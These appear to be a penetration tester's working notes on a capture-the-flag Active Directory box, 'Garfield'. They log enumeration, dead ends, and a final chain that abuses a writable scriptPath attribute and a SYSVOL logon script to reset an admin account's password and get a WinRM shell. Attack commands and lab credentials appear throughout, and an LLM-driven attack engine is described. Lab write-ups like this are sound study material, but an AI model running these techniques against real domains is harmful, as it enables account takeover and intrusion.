# Garfield — 10.129.16.228

## 23:19 — Recon
- DC01.garfield.htb — Windows Server 2019, Domain: GARFIELD
- Ports: DNS(53), Kerberos(88), RPC(135), SMB(445), LDAP(389), RDP(3389), WinRM(5985)
- SMB signing required, clock skew +8h
- Second IP on DC: 192.168.100.1 (internal network)
- No web services, no non-standard ports

## 23:23 — User Enumeration
- Valid: administrator, j.arbuckle, l.wilson (KDC_ERR_PREAUTH_FAILED)
- Disabled: guest, krbtgt
- No AS-REP roastable accounts
- Null SMB: STATUS_ACCESS_DENIED on share listing
- Anonymous LDAP: bind OK but search requires auth (operationsError 000004DC)
- RID cycling: STATUS_ACCESS_DENIED on lsarpc

## 23:24 — Password Spray
- 36 themed passwords against j.arbuckle and l.wilson: all failed
- No lockouts observed

## 07:18 — Authenticated Enumeration (IP changed to 10.129.17.44)
- j.arbuckle is standard domain user (IT Support group), NOT admin
- Shares: IPC$, NETLOGON, SYSVOL readable. ADMIN$/C$ NOT readable on this instance.
- SYSVOL `scripts/` is WRITABLE by j.arbuckle
- printerDetect.bat in scripts/ — not assigned as logon script initially

## 07:20 — LDAP Enumeration
- Users: administrator, j.arbuckle, l.wilson, l.wilson_adm, krbtgt_8245
- l.wilson: Remote Management Users, Remote Desktop Users
- l.wilson_adm: Tier 1, Remote Management Users, Remote Desktop Users
- RODC01 (192.168.100.2): Windows Server 2019 Datacenter — NOT reachable from us
- RODC has Administrator in msDS-RevealedUsers (password cached)
- No LAPS, no gMSA, no ADCS, no Kerberoastable SPNs
- Password policy: complexity OFF, no lockout, min length 7

## 07:25 — Bloodhound + ACL Analysis
- Bloodhound chain: l.wilson → ForceChangePassword → l.wilson_adm → ForceChangePassword+WriteAccountRestrictions → RODC01$ → ForceChangePassword → krbtgt_8245
- Bloodhound MISSED key ACE: IT Support has WriteProp on GUID bf9679a8
- Schema lookup: bf9679a8 = scriptPath (NOT member as initially thought)
- j.arbuckle can set scriptPath on ANY user in CN=Users container

## 08:26 — scriptPath Exploitation
- Set l.wilson's scriptPath to printerDetect.bat (SYSVOL scripts/)
- Modified bat with NTLM coercion → captured l.wilson NTLMv2 hash
- Hash NOT crackable: tried rockyou, 10M, 412K themed, darkc0de, rules — all failed
- Reverse shell bat blocked (likely AV/AMSI)

## 08:55 — Password Reset via scriptPath (FAILED)
- Modified bat to: `net user l.wilson_adm H4ck3d!@2026 /domain`
- Polled 10+ minutes, password never changed
- Also tried VBS ADSI SetPassword approach — same result
- Conclusion: logon simulation is NOT firing scriptPath execution

## 09:40 — IP changed to 10.129.17.46 (box reset)
- Re-staged scriptPath + bat immediately on fresh instance
- Set scriptPath on BOTH l.wilson and l.wilson_adm
- Polled 10+ minutes — NO logon script execution detected
- No responder activity at all on new instance

## 09:55 — NTLM Relay Attempts
- Created machine account FAKEPC$ (MAQ=10)
- Fixed ntlmrelayx port binding bug (needs `sleep infinity | ntlmrelayx` to keep stdin open)
- PetitPotam coercion works — DC01$ authenticates to our SMB
- Relay to LDAP: FAILED — "client requested signing, relaying to LDAP will not work"
- Relay to LDAPS: FAILED — "socket ssl wrapping error: Connection reset by peer" (channel binding enforced)
- NTLM relay is a DEAD PATH on this box

## 10:23 — IP changed to 10.129.17.33 (box reset #2)
- setup.sh ran within seconds of spawn
- VBS ADSI SetPassword bat uploaded, scriptPath set on l.wilson
- Polled 20+ minutes — no logon, no password change, no result.txt
- Responder captured ZERO traffic from this instance
- ntlmrelayx was on port 445 for 7+ hours — may have swallowed auth signals
- noPac (CVE-2021-42278): PATCHED — sAMAccountName rename rejected
- PrintNightmare (CVE-2021-1675): FAILED — 0x8001011b, no driver install rights

## 17:50 — Comprehensive ACL re-audit
- IT Support has ONLY WriteProp(scriptPath) on user objects — nothing else
- Domain Users/Authenticated Users have no unusual write permissions
- Tier 1 group has NO ACLs on any target objects
- Everyone has CREATE_CHILD on DNS zone → can create DNS records
- Port 2179 (vmrdp) open → Hyper-V running, RODC01 is likely a VM on DC01

## 18:00 — ADIDNS Exploitation
- dnstool.py (krbrelayx) creates records that RESOLVE on some instances
- nsupdate -g (Kerberos GSS-TSIG) creates records that ALWAYS RESOLVE
- Created wildcard *.garfield.htb → our IP (works on instance 10.129.17.33)
- Created pwned.garfield.htb, pwned3.garfield.htb → our IP
- WPAD blocked by Global Query Block List (GQBL)
- Wildcard DNS + ntlmrelayx: zero traffic captured in 5+ minutes

## 19:00 — IP changed to 10.129.17.70 (box reset #3)
- setup.sh ran immediately, clean bat (no SYSVOL redirect)
- Created FAKEPC$ machine account again
- Set FAKEPC$ dNSHostName = FAKEPC.garfield.htb → SUCCESS
- Added SPNs cifs/FAKEPC.garfield.htb, HOST/FAKEPC.garfield.htb → SUCCESS
- DNS: FAKEPC.garfield.htb → our IP (via nsupdate -g)
- RBCD set on FAKEPC$ allowing DC01$ to delegate (via rbcd.py)
- Attempted krbrelayx Kerberos relay: same stdin/port binding bug
- Printing vectors: no printers configured, can't add (ACCESS_DENIED), no printQueue create rights

## Dead Ends Summary
- Password spray: thousands of candidates, all failed
- Hash cracking: rockyou, 10M, 412K themed, rules — uncrackable
- NTLM relay: SMB signing blocks LDAP, channel binding blocks LDAPS
- Kerberos relay (krbrelayx): same port binding bug as ntlmrelayx
- Reverse shell via bat: AV/AMSI blocks PowerShell
- RODC01 (192.168.100.2): not reachable from attacker
- Logon script simulation: worked ONCE on first instance, never again on 3 subsequent resets
- noPac: PATCHED
- PrintNightmare: PATCHED/no rights
- ADIDNS wildcard: resolves but no passive traffic to capture
- Printer operations: all ACCESS_DENIED, no printers configured

## Still Alive
- FAKEPC$ machine account with SPN + DNS pointing to us (Kerberos target)
- scriptPath write + SYSVOL write (if logon simulation ever fires)
- PetitPotam coercion (DC01$ connects to us but relay fails)
- Password poller running in background

## Key Unsolved Questions
1. Why did l.wilson log in ONCE (first instance) but never again?
2. What triggers printerDetect.bat? Logon script? Scheduled task? Print event?
3. Can we fix krbrelayx port binding and do Kerberos-to-LDAP relay?
4. Is there a Hyper-V attack vector via port 2179?
5. What is the ACTUAL intended path on this hard box?

## 10:00 — Engine Run (pentest-engine v2 with drift detection + compaction)

### Iteration 0: WinRM Relay
- Plan: relay PetitPotam coercion to WinRM (port 5985) — EPA unknown
- Result: ntlmrelayx started, PetitPotam "Attack worked!" but relay never received connection
- Same issue as LDAP relay — coercion triggers but auth doesn't reach our listener
- **HARD BLOCK: ALL NTLM relay is dead on this box**

### Iteration 1: RODC PRG Membership Write
- Plan: add l.wilson to Allowed RODC Password Replication Group via WriteProp
- Result: `insufficientAccessRights` — WriteProp on RODC PRG is for scriptPath (bf9679a8), NOT member
- Earlier surface entry was WRONG: misidentified bf9679a8 as "member" attribute
- **HARD BLOCK: RODC PRG membership write denied**

### Iteration 2: Global Catalog Sensitive Attrs  
- Plan: query GC (3268) for userPassword/msSFU30Password/confidential attrs
- Result: same attribute set as LDAP 389, no extra creds
- Found: RPC-HTTP on 593, ADWS on 9389, confirmed RODC01 has Admin revealed
- **HARD BLOCK: GC adds no new data**

### Iteration 3: RPC-over-HTTP
- Plan: enumerate RPC interfaces over HTTP (port 593)  
- Result: 9 interfaces including DCSync (MS-DRSR), SAMR, LSARPC on HTTP port 49670
- But j.arbuckle lacks replication rights — same interfaces as SMB, no new access
- **HARD BLOCK: HTTP transport adds no new capabilities**

### Iteration 4: pending...
- 29 dead branches, 93 tested entries
- Engine compacting state (26KB → ~8KB via LLM)

### Key Observations from Engine Run
- Drift detection working: killed 2 executors at 10-tool limit (WinRM relay, RODC PRG)
- LLM compaction working: 38KB→4KB tested, 10KB→1.5KB surface
- Planner quality good with comprehensive hint — picking genuinely new angles
- Main bottleneck: planner calls (20-80s each), compaction overhead
- The bf9679a8 = scriptPath (NOT member) was a critical correction from the engine's ACL audit

### Iteration 4: Full TCP Scan (.178)
- Plan: full port scan on correct IP
- Result: 22 ports open. New: 139(netbios), 464(kpasswd5), high RPC ports
- kpasswd5 on 464 — Kerberos password change service (potential alternate password change path?)

### Iteration 5: RPC-over-HTTP (593)
- Plan: enumerate RPC interfaces over HTTP
- Result: 9 interfaces on ncacn_http port 49670 including:
  - **MS-DRSR (DCSync)** via ntdsai.dll
  - MS-LSAT, MS-SAMR, NETLOGON
- j.arbuckle lacks replication rights so DCSync won't work
- But: if we ever get higher-priv creds, HTTP transport bypasses SMB signing

### Iteration 6: Global Catalog (3268)
- Plan: query GC for sensitive/hidden attributes
- Result: same attrs as LDAP 389, no extra creds
- Confirmed RODC01 has Administrator in msDS-RevealedUsers

### Iteration 7: Hyper-V vmrdp (2179)
- Plan: check if j.arbuckle can access RODC01 VM console via vmrdp
- **IN PROGRESS** — this is interesting because vmrdp uses different ACLs than WMI
- If we can reach RODC01 console, we bypass the 192.168.100.0/24 routing issue

### Running totals
- 29 dead branches, 93 tested entries
- Engine iterations taking ~2 min each with compaction
- Planner making good picks now — systematically exploring new services

### Iteration 7 result: Hyper-V vmrdp (2179)
- Executor ran 10 tool calls: ncat, xfreerdp, nc, python3, nmap rdp scripts
- Result LOST — executor returned non-JSON, streaming parser didn't capture it
- Need to re-test manually: nmap -sV -p 2179 --script=rdp-enum-encryption,rdp-ntlm-info 10.129.17.178

### Iteration 8: Full TCP scan (.178) — drift killed
- Same scan we already did manually — 22 ports, nothing new
- Drift killed at 10 tools

### Engine bug identified
- When executor's claude -p returns non-JSON, the streaming parser drops the entire result
- Need to capture the final text even if it doesn't validate as JSON

### Hyper-V 2179 manual test
- Port accepts TCP connections but no banner — waits for protocol handshake
- nmap: "vmrdp?" — can't fingerprint, no RDP scripts trigger
- This is Hyper-V VM Connect protocol, not standard RDP
- Would need Hyper-V management tools (Windows-only) to interact
- **Likely dead end for Linux-based attacker — but confirms RODC01 is a Hyper-V VM**

### Iteration 4 (manual): Full Port Scan .178
- 22 open ports, all standard AD DC services
- No new attack surface — same ports as .228/.44
- vmrdp 2179 confirmed open, kpasswd 464, HTTP-RPC 593, ADWS 9389

### Summary after 5 engine iterations + manual scan
Dead ends: 30+. All standard AD attack paths exhausted.
Still alive:
1. scriptPath write (works but logon sim never fires)
2. PetitPotam coercion (works but relay fails everywhere)
3. FAKEPC$ machine account (SPN + DNS, but can't get anyone to auth to it)
4. DNS write (can create records, but no traffic to poison)

The box seems designed around triggering l.wilson's logon. We captured her hash ONCE on the first instance but it never fired again across 5+ resets. The SeBatchLogonRight GPO confirms a mechanism exists. What triggers it?

### Iteration 8: ADWS 9389
- SOAP/WCF protocol, not LDAP — ldapsearch fails on port 9389
- Requires WS-Management with Kerberos SPNEGO — can't use from Linux easily
- **HARD BLOCK: ADWS not exploitable without Windows PowerShell**

### Engine bug: lost results
- Executor returns findings but final JSON doesn't parse → state not updated
- Planner re-picks the same branch because tested.jsonl wasn't written
- Fixed by manually logging results. Need to fix streaming parser.

### Status after engine run
- **31 dead branches, ~97 tested entries**
- Every new service port has been explored and blocked
- Remaining attack surface is VERY narrow:
  1. kpasswd5 (464) — Kerberos password change, unexplored
  2. Triggering l.wilson logon somehow
  3. Something we're not seeing (thematic? timing? different protocol?)

### Engine Iteration 5: ADWS (9389)
- ADWS needs .NET WCF stack, not available from Linux
- LDAP on 9389 = "Can't contact LDAP server", SOAP probes = ConnectionReset
- **HARD BLOCK**

### Engine Iteration 6: Hyper-V vmrdp (2179)
- ncat raw + SSL probes, xfreerdp auth test, nmap rdp scripts
- Executor drift-killed at 10 tools before completing analysis
- Port open but vmrdp is a proprietary Hyper-V console protocol

### Engine Iteration 7: ForceChangePassword on l.wilson
- rpcclient setuserinfo2 l.wilson 23 → NT_STATUS_ACCESS_DENIED
- bloodyAD set password → same result
- j.arbuckle does NOT have ForceChangePassword on l.wilson
- **HARD BLOCK**

### Engine Run Summary (10 iterations total across 2 runs)
- 33 dead branches, 101 tested entries
- Novel findings: RPC-HTTP interfaces on port 49670, ADWS not Linux-accessible
- Corrected: bf9679a8 = scriptPath NOT member (critical fix)
- ALL standard AD attack paths now exhausted from j.arbuckle's access level

### Remaining Attack Surface (almost nothing left)
1. **scriptPath write** — only useful if logon sim fires (never does)
2. **PetitPotam coercion** — DC01$ auths but relay fails everywhere
3. **FAKEPC$ machine account** — SPN + DNS but no one authenticates to it
4. **DNS write** — can create records but no traffic to poison
5. **Hyper-V port 2179** — open but unexplored (vmrdp protocol)

### The Box Is Stuck At One Question
How do we get l.wilson's credentials? Every path leads here:
- Can't crack her hash (uncrackable)
- Can't reset her password (no ForceChangePassword)
- Can't trigger her logon script (never fires)
- Can't relay to get her TGT (all relay dead)
- Can't write to PRG (only scriptPath)
- The ONLY thing we can do is SET HER SCRIPTPATH and write to SYSVOL

Something about the Garfield theme or the scriptPath mechanism is the key we're missing.

## 10:31 — Focused scriptPath Engine Run (10 iterations)

### Iteration 0: kpasswd5 password reset
- changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle → access denied
- kpasswd checks same ACL as SAMR — no password change rights
- **HARD BLOCK: kpasswd also denied**

## 10:36 — Manual scriptPath + Responder Setup
- Set scriptPath = \\10.10.17.114\share\x.bat on:
  - l.wilson ✓
  - l.wilson_adm ✓  
  - krbtgt_8245 ✓
  - administrator DENIED (protected or different ACL)
- Responder running on tun0, listening for auth
- Engine still running in parallel (iteration 1+)
- kpasswd5 test: access denied (same ACL as SAMR)

## 10:42 — BREAKTHROUGH: scriptPath trigger mechanism discovered

### How it works
The logon/scheduled task fires when **scriptPath is changed** (attribute change event, not a timer).
- Set scriptPath → task fires within ~5 min → executes the bat as l.wilson
- Toggle scriptPath (change to something else, change back) → fires again

### Evidence
- 10:42:49 — First hash captured after setting scriptPath to \\10.10.17.114\share\x.bat
- 10:49:00 — Second hash captured after toggling scriptPath (x.bat → printerDetect.bat)
- Both times, the `dir \\10.10.17.114\share` callback confirmed bat execution

### Why it didn't work on previous instances
On instances 2-5, we set scriptPath ONCE and waited. It probably fired once but we either:
- Didn't have responder running yet
- Had ntlmrelayx on port 445 swallowing the connection
- Modified the bat AFTER it fired (too late)

### Current status
- Bat runs as l.wilson ✓
- `net user l.wilson_adm P@ssw0rd2026! /domain` in the bat did NOT change the password
- Likely because `net user /domain` uses NetUserSetInfo which checks different perms than ForceChangePassword
- Need to use PowerShell `Set-ADAccountPassword` or SAMR-based approach instead

### Next steps
1. Fix the bat to use PowerShell or rpcclient-style password reset
2. Toggle scriptPath to trigger
3. Poll for l.wilson_adm password change
4. If password changes → WinRM as l.wilson_adm → continue chain

## 10:51 — l.wilson_adm PASSWORD CHANGED + WINRM SHELL

### Attack chain executed:
1. Set printerDetect.bat = PowerShell Set-ADAccountPassword -Identity l.wilson_adm -Reset
2. Toggle l.wilson scriptPath to trigger logon task
3. Bat fired within seconds, changed l.wilson_adm password to P@ssw0rd2026!
4. WinRM confirmed: Pwn3d!

### Creds
- l.wilson_adm : P@ssw0rd2026! (Tier 1, Remote Management Users, Remote Desktop Users)
